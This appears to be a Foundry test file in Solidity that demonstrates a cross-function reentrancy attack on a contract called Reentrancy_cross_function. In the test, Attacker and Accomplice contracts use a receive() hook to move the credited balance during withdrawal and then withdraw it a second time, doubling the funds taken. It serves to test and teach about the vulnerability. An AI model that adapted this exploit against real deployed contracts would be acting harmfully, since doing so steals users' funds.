
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_cross_function} from "../src/Reentrancy_cross_function.sol";

contract TestReentrancy_cross_function is Test {
    Reentrancy_cross_function public _contractUnderTest;
    
    Attacker public _attacker;
    Accomplice public _accomplice;

    function setUp() public {
        _contractUnderTest = new Reentrancy_cross_function();
        _accomplice = new Accomplice();
        _attacker = new Attacker(address(_contractUnderTest), address(_accomplice));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        bytes32 slot = keccak256(abi.encode(address(_attacker), uint256(0)));
        vm.store(address(_contractUnderTest), slot, bytes32(attackVal));

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_cross_function public _victim;
    address public accomplice;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress, address acc) { 
        _victim = Reentrancy_cross_function(victimAddress);
        accomplice = acc;
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance + accomplice.balance;
        storedAttackVal = val;
        _victim.withdrawBalance();
        Accomplice(accomplice).withdrawFrom(address(_victim));
        uint256 finalBalance = address(this).balance + accomplice.balance;
        if (finalBalance == initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.transfer(accomplice, storedAttackVal);
            attackCallCount++;
        }
    }
}

contract Accomplice {
    function withdrawFrom(address victim) external {
        Reentrancy_cross_function(victim).withdrawBalance();
    }

    receive() external payable {}
}
